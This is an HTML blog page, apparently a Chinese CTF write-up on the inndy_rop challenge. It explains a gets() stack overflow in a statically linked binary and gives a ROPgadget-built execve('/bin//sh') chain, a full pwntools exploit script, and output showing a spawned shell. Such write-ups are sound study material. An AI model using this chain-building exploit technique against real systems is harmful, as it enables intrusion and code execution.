@@ -1,0 +1,620 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+  <!-- Minima -->
+  <!-- Hexo theme created by @adisaktijrs -->
+
+  <!-- Basic Page Needs
+  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
+  <meta charset="utf-8">
+
+  
+  <title>Statically Linked</title>
+  
+  <link rel="canonical" href="http://mykonos-x.github.io/2022/10/01/Statically-Linked/">
+  
+  <meta name="description" content="通过file指令可以看到程序编译的链接状态，在知道程序可以通过ROP来打的情况下，根据statically linked和dynamically linked两种链接方式来构造对应的ropchain和对应不同的攻击思路 dynamically linked 如果程序是动态链接的话，泄露程序函数的真实">
+  
+  
+  <meta name="author" content="Ez3ki3l">
+  
+  
+  
+  <meta property="og:site_name" content="Silence to hear." />
+  <meta property="og:type" content="article" />
+  <meta property="og:title" content="Statically Linked" />
+  
+  <meta property="og:description" content="通过file指令可以看到程序编译的链接状态，在知道程序可以通过ROP来打的情况下，根据statically linked和dynamically linked两种链接方式来构造对应的ropchain和对应不同的攻击思路 dynamically linked 如果程序是动态链接的话，泄露程序函数的真实">
+  
+  <meta property="og:url" content="http://mykonos-x.github.io/2022/10/01/Statically-Linked/" />
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Statically Linked">
+  
+  <meta name="twitter:description" content="通过file指令可以看到程序编译的链接状态，在知道程序可以通过ROP来打的情况下，根据statically linked和dynamically linked两种链接方式来构造对应的ropchain和对应不同的攻击思路 dynamically linked 如果程序是动态链接的话，泄露程序函数的真实">
+  
+  
+  
+  
+  <meta name="twitter:url" content="http://mykonos-x.github.io/2022/10/01/Statically-Linked/" />
+
+  <!-- Mobile Specific Metas
+  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <!-- Preload fonts
+  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
+  <link rel="preload" href="/fonts/dm-serif-display-v4-latin-regular.woff2" as="font" type="font/woff2" crossorigin>
+  <link rel="preload" href="/fonts/inter-v2-latin-regular.woff2" as="font" type="font/woff2" crossorigin>
+
+  <!-- CSS
+  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
+  
+<link rel="stylesheet" href="/css/normalize.css">
+
+  
+<link rel="stylesheet" href="/css/skeleton.css">
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+<link rel="stylesheet" href="/css/prism-dark.css">
+
+  
+<link rel="stylesheet" href="/css/prism-line-numbers.css">
+
+  <!-- User css -->
+  
+  
+<link rel="stylesheet" href="/css/user.css">
+
+  
+
+  <!-- Favicon
+  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
+  <link rel="icon" type="image/png" href="/images/favicon.png">
+
+  <!-- Custom Theme Color Style
+  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
+  <style>
+  a:not(.icon) {
+    text-decoration-color: #7cc1df;
+    background-image: linear-gradient(
+      to bottom,
+      rgba(0, 0, 0, 0) 50%,
+      #7cc1df 50%
+    );
+  }
+  blockquote {
+    border-left: 8px solid #7cc1df;
+  }
+  .nanobar .bar {
+    background: #7cc1df;
+  }
+  .button.button-primary:hover,
+  button.button-primary:hover,
+  input[type="submit"].button-primary:hover,
+  input[type="reset"].button-primary:hover,
+  input[type="button"].button-primary:hover,
+  .button.button-primary:focus,
+  button.button-primary:focus,
+  input[type="submit"].button-primary:focus,
+  input[type="reset"].button-primary:focus,
+  input[type="button"].button-primary:focus {
+    background-color: #7cc1df;
+    border-color: #7cc1df;
+  }
+  input[type="email"]:focus,
+  input[type="number"]:focus,
+  input[type="search"]:focus,
+  input[type="text"]:focus,
+  input[type="tel"]:focus,
+  input[type="url"]:focus,
+  input[type="password"]:focus,
+  textarea:focus,
+  select:focus {
+    border: 1px solid #7cc1df;
+  }
+</style>
+
+  <!-- Google Analytics (With Privacy Settings On)
+  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
+  
+
+  
+  <script src="/js/pic.min.js" defer></script>
+  
+
+  
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div class="container">
+    <div class="row">
+      <div>
+
+        <div class="row">
+  <div class="two columns" style="max-width: 50px">
+    <h1 class="mt-2 mode">
+      <div onclick=setDarkMode(true) id="darkBtn">🌑</div>
+      <div onclick=setDarkMode(false) id="lightBtn" class=hidden>☀️</div>
+      <script >
+        if (localStorage.getItem('preferredTheme') == 'dark') {
+          setDarkMode(true)
+        }
+        function setDarkMode(isDark) {
+          var darkBtn = document.getElementById('darkBtn')
+          var lightBtn = document.getElementById('lightBtn')
+          if (isDark) {
+            lightBtn.style.display = "block"
+            darkBtn.style.display = "none"
+            localStorage.setItem('preferredTheme', 'dark');
+          } else {
+            lightBtn.style.display = "none"
+            darkBtn.style.display = "block"
+            localStorage.removeItem('preferredTheme');
+          }
+          document.body.classList.toggle("darkmode");
+        }
+      </script>
+    </h1>
+  </div>
+
+  <div class="six columns ml-1">
+    <h1 class="mt-2">
+      Hi there.
+    </h1>
+  </div>
+
+  <div class="twelve columns">
+    <div class="row">
+      <div class="nine columns left">
+        <a href="/">Home</a>
+        
+          
+          <a href="/about" class="ml">About</a>
+          
+        
+        
+          
+            <a href="mailto:g0dzirrazhou@gmail.com" target="_blank" class="ml">Email</a>
+          
+        
+      </div>
+    </div>
+    <hr style="margin-bottom: 2.6rem">
+  </div>
+</div>
+
+        <div class="trans">
+            <h2>Statically Linked</h2>
+
+  <p>通过<code>file</code>指令可以看到程序编译的链接状态，在知道程序可以通过ROP来打的情况下，根据<code>statically linked</code>和<code>dynamically linked</code>两种链接方式来构造对应的ropchain和对应不同的攻击思路</p>
+<h4><span id="dynamically-linked">dynamically linked</span></h4>
+<p>如果程序是动态链接的话，泄露程序函数的真实地址后拿到libc基址去得到例如<code>system</code>和<code>/bin/sh</code>的地址，这里不再赘述</p>
+<h4><span id="statically-linked">statically linked</span></h4>
+<p>如果程序是静态链接，相对与动态链接就没有那么麻烦了，有的程序我们可以通过<code>ROPgadget</code>这个工具来帮助我们构造我们的ropchain</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ROPgadget <span class="token parameter variable">--binary</span> 程序名 <span class="token parameter variable">--ropchain</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h5><span id="example-inndyrop">Example-inndyrop</span></h5>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">m1nus@ubuntu:~/elf/buu/inndy_rop$ <span class="token function">file</span> inndy_rop 
+inndy_rop: ELF <span class="token number">32</span>-bit LSB executable, Intel <span class="token number">80386</span>, version <span class="token number">1</span> <span class="token punctuation">(</span>GNU/Linux<span class="token punctuation">)</span>, statically linked, <span class="token keyword">for</span> GNU/Linux <span class="token number">2.6</span>.32, BuildID<span class="token punctuation">[</span>sha1<span class="token punctuation">]</span><span class="token operator">=</span>e9ed96cd1a8ea3af86b7b73048c909236d570d9e, not stripped<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>程序运行后接收一次用户输入就结束</p>
+<h6><span id="main">main()</span></h6>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// positive sp value has been detected, the output may be wrong!</span>
+<span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token function">overflow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>只有一个overflow()函数</p>
+<h6><span id="overflow">overflow()</span></h6>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">overflow</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token keyword">char</span> v1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+Ch] [ebp-Ch] BYREF</span>
+
+  <span class="token keyword">return</span> <span class="token function">gets</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>overflow()函数，通过<code>gets()</code>来接收用户输入，没有限制用户输入长度，此处stack overflow</p>
+<p>（通过IDA进行反编译的时候会发现程序里面函数比较多比较乱，这是因为程序是<code>statically linked</code>，由于没有调用动态链接库里的函数，所以全部的函数都靠自己实现）</p>
+<p>既然是静态链接我们直接上ROPgadget</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#ROPgadget --binary inndy_rop --ropchain</span>
+
+<span class="token keyword">from</span> struct <span class="token keyword">import</span> pack
+
+<span class="token comment"># Padding goes here</span>
+p <span class="token operator">=</span> <span class="token string">b''</span>
+
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806ecda</span><span class="token punctuation">)</span> <span class="token comment"># pop edx ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea060</span><span class="token punctuation">)</span> <span class="token comment"># @ .data</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080b8016</span><span class="token punctuation">)</span> <span class="token comment"># pop eax ; ret</span>
+p <span class="token operator">+=</span> <span class="token string">b'/bin'</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0805466b</span><span class="token punctuation">)</span> <span class="token comment"># mov dword ptr [edx], eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806ecda</span><span class="token punctuation">)</span> <span class="token comment"># pop edx ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea064</span><span class="token punctuation">)</span> <span class="token comment"># @ .data + 4</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080b8016</span><span class="token punctuation">)</span> <span class="token comment"># pop eax ; ret</span>
+p <span class="token operator">+=</span> <span class="token string">b'//sh'</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0805466b</span><span class="token punctuation">)</span> <span class="token comment"># mov dword ptr [edx], eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806ecda</span><span class="token punctuation">)</span> <span class="token comment"># pop edx ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea068</span><span class="token punctuation">)</span> <span class="token comment"># @ .data + 8</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080492d3</span><span class="token punctuation">)</span> <span class="token comment"># xor eax, eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0805466b</span><span class="token punctuation">)</span> <span class="token comment"># mov dword ptr [edx], eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080481c9</span><span class="token punctuation">)</span> <span class="token comment"># pop ebx ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea060</span><span class="token punctuation">)</span> <span class="token comment"># @ .data</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080de769</span><span class="token punctuation">)</span> <span class="token comment"># pop ecx ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea068</span><span class="token punctuation">)</span> <span class="token comment"># @ .data + 8</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806ecda</span><span class="token punctuation">)</span> <span class="token comment"># pop edx ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea068</span><span class="token punctuation">)</span> <span class="token comment"># @ .data + 8</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080492d3</span><span class="token punctuation">)</span> <span class="token comment"># xor eax, eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a66f</span><span class="token punctuation">)</span> <span class="token comment"># inc eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a66f</span><span class="token punctuation">)</span> <span class="token comment"># inc eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a66f</span><span class="token punctuation">)</span> <span class="token comment"># inc eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a66f</span><span class="token punctuation">)</span> <span class="token comment"># inc eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a66f</span><span class="token punctuation">)</span> <span class="token comment"># inc eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a66f</span><span class="token punctuation">)</span> <span class="token comment"># inc eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a66f</span><span class="token punctuation">)</span> <span class="token comment"># inc eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a66f</span><span class="token punctuation">)</span> <span class="token comment"># inc eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a66f</span><span class="token punctuation">)</span> <span class="token comment"># inc eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a66f</span><span class="token punctuation">)</span> <span class="token comment"># inc eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a66f</span><span class="token punctuation">)</span> <span class="token comment"># inc eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806c943</span><span class="token punctuation">)</span> <span class="token comment"># int 0x80</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>以上就是我们通过ROPgadget构造出的ropchain，前面加上覆盖函数返回地址的padding即可</p>
+<h6><span id="exp">exp</span></h6>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">from</span> struct <span class="token keyword">import</span> pack
+context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">"linux"</span> <span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">'i386'</span> <span class="token punctuation">,</span> log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">)</span>
+elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"inndy_rop"</span><span class="token punctuation">)</span>
+host<span class="token operator">=</span><span class="token string">"node4.buuoj.cn"</span>
+port<span class="token operator">=</span><span class="token number">26277</span>
+local<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"0 for remote , 1 for local:\t"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+io <span class="token operator">=</span> process<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>path<span class="token punctuation">)</span> <span class="token keyword">if</span> local<span class="token operator">==</span><span class="token number">1</span> <span class="token keyword">else</span> remote<span class="token punctuation">(</span>host<span class="token punctuation">,</span>port<span class="token punctuation">)</span>
+<span class="token comment"># Padding goes here</span>
+p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0xc</span> <span class="token operator">+</span> <span class="token number">0x4</span><span class="token punctuation">)</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806ecda</span><span class="token punctuation">)</span> <span class="token comment"># pop edx ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea060</span><span class="token punctuation">)</span> <span class="token comment"># @ .data</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080b8016</span><span class="token punctuation">)</span> <span class="token comment"># pop eax ; ret</span>
+p <span class="token operator">+=</span> <span class="token string">b'/bin'</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0805466b</span><span class="token punctuation">)</span> <span class="token comment"># mov dword ptr [edx], eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806ecda</span><span class="token punctuation">)</span> <span class="token comment"># pop edx ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea064</span><span class="token punctuation">)</span> <span class="token comment"># @ .data + 4</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080b8016</span><span class="token punctuation">)</span> <span class="token comment"># pop eax ; ret</span>
+p <span class="token operator">+=</span> <span class="token string">b'//sh'</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0805466b</span><span class="token punctuation">)</span> <span class="token comment"># mov dword ptr [edx], eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806ecda</span><span class="token punctuation">)</span> <span class="token comment"># pop edx ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea068</span><span class="token punctuation">)</span> <span class="token comment"># @ .data + 8</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080492d3</span><span class="token punctuation">)</span> <span class="token comment"># xor eax, eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0805466b</span><span class="token punctuation">)</span> <span class="token comment"># mov dword ptr [edx], eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080481c9</span><span class="token punctuation">)</span> <span class="token comment"># pop ebx ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea060</span><span class="token punctuation">)</span> <span class="token comment"># @ .data</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080de769</span><span class="token punctuation">)</span> <span class="token comment"># pop ecx ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea068</span><span class="token punctuation">)</span> <span class="token comment"># @ .data + 8</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806ecda</span><span class="token punctuation">)</span> <span class="token comment"># pop edx ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea068</span><span class="token punctuation">)</span> <span class="token comment"># @ .data + 8</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080492d3</span><span class="token punctuation">)</span> <span class="token comment"># xor eax, eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a66f</span><span class="token punctuation">)</span> <span class="token comment"># inc eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a66f</span><span class="token punctuation">)</span> <span class="token comment"># inc eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a66f</span><span class="token punctuation">)</span> <span class="token comment"># inc eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a66f</span><span class="token punctuation">)</span> <span class="token comment"># inc eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a66f</span><span class="token punctuation">)</span> <span class="token comment"># inc eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a66f</span><span class="token punctuation">)</span> <span class="token comment"># inc eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a66f</span><span class="token punctuation">)</span> <span class="token comment"># inc eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a66f</span><span class="token punctuation">)</span> <span class="token comment"># inc eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a66f</span><span class="token punctuation">)</span> <span class="token comment"># inc eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a66f</span><span class="token punctuation">)</span> <span class="token comment"># inc eax ; retx</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a66f</span><span class="token punctuation">)</span> <span class="token comment"># inc eax ; ret</span>
+p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806c943</span><span class="token punctuation">)</span> <span class="token comment"># int 0x80</span>
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Starting <span class="token builtin class-name">local</span> process <span class="token string">'/home/m1nus/elf/buu/inndy_rop/inndy_rop'</span> <span class="token assign-left variable">argv</span><span class="token operator">=</span><span class="token punctuation">[</span>b<span class="token string">'/home/m1nus/elf/buu/inndy_rop/inndy_rop'</span><span class="token punctuation">]</span> <span class="token builtin class-name">:</span> pid <span class="token number">12744</span>
+<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent 0x95 bytes:
+    00000000  <span class="token number">61</span> <span class="token number">61</span> <span class="token number">61</span> <span class="token number">61</span>  <span class="token number">61</span> <span class="token number">61</span> <span class="token number">61</span> <span class="token number">61</span>  <span class="token number">61</span> <span class="token number">61</span> <span class="token number">61</span> <span class="token number">61</span>  <span class="token number">61</span> <span class="token number">61</span> <span class="token number">61</span> <span class="token number">61</span>  │aaaa│aaaa│aaaa│aaaa│
+    00000010  da ec 06 08  <span class="token number">60</span> a0 0e 08  <span class="token number">16</span> <span class="token number">80</span> 0b 08  2f <span class="token number">62</span> <span class="token number">69</span> 6e  │····│<span class="token variable"><span class="token variable">`</span>···│····│/bin│
+    00000020  6b <span class="token number">46</span> 05 08  da ec 06 08  <span class="token number">64</span> a0 0e 08  <span class="token number">16</span> <span class="token number">80</span> 0b 08  │kF··│····│d···│····│
+    00000030  2f 2f <span class="token number">73</span> <span class="token number">68</span>  6b <span class="token number">46</span> 05 08  da ec 06 08  <span class="token number">68</span> a0 0e 08  │//sh│kF··│····│h···│
+    00000040  d3 <span class="token number">92</span> 04 08  6b <span class="token number">46</span> 05 08  c9 <span class="token number">81</span> 04 08  <span class="token number">60</span> a0 0e 08  │····│kF··│····│<span class="token variable">`</span></span>···│
+    00000050  <span class="token number">69</span> e7 0d 08  <span class="token number">68</span> a0 0e 08  da ec 06 08  <span class="token number">68</span> a0 0e 08  │i···│h···│····│h···│
+    00000060  d3 <span class="token number">92</span> 04 08  6f a6 07 08  6f a6 07 08  6f a6 07 08  │····│o···│o···│o···│
+    00000070  6f a6 07 08  6f a6 07 08  6f a6 07 08  6f a6 07 08  │o···│o···│o···│o···│
+    *
+    00000090  <span class="token number">43</span> c9 06 08  0a                                     │C···│·│
+    00000095
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Switching to interactive mode
+$ <span class="token function">id</span>
+<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent 0x3 bytes:
+    b<span class="token string">'id\n'</span>
+<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0x87 bytes:
+    b<span class="token string">'uid=1000(m1nus) gid=1000(m1nus) groups=1000(m1nus),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare)\n'</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>m1nus<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>m1nus<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>m1nus<span class="token punctuation">)</span>,4<span class="token punctuation">(</span>adm<span class="token punctuation">)</span>,24<span class="token punctuation">(</span>cdrom<span class="token punctuation">)</span>,27<span class="token punctuation">(</span>sudo<span class="token punctuation">)</span>,30<span class="token punctuation">(</span>dip<span class="token punctuation">)</span>,46<span class="token punctuation">(</span>plugdev<span class="token punctuation">)</span>,120<span class="token punctuation">(</span>lpadmin<span class="token punctuation">)</span>,131<span class="token punctuation">(</span>lxd<span class="token punctuation">)</span>,132<span class="token punctuation">(</span>sambashare<span class="token punctuation">)</span><span 